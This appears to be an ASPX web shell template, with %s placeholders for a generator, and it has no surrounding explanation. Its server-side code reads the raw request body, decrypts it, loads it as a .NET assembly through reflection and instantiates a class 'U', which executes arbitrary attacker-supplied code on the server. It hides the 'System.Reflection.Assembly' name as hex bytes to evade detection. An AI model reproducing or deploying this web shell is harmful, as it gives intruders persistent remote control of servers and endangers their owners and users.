<%%@ Page Language="C#" %%>
    <%%@Import Namespace="System.Reflection" %%>
    <script runat="server">

       %s


    </script>
        <%%
        //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(%s(c)).CreateInstance("U").Equals(this);
                byte[] c=Request.BinaryRead(Request.ContentLength);
        		string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
        		Type assembly=Type.GetType(asname);
        			MethodInfo load = assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});
        			object obj=load.Invoke(null, new object[]{Decrypt(c)});
        			MethodInfo create = assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});
        			string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
        			object pay=create.Invoke(obj,new object[] { name });
        			pay.Equals(this);
        %%>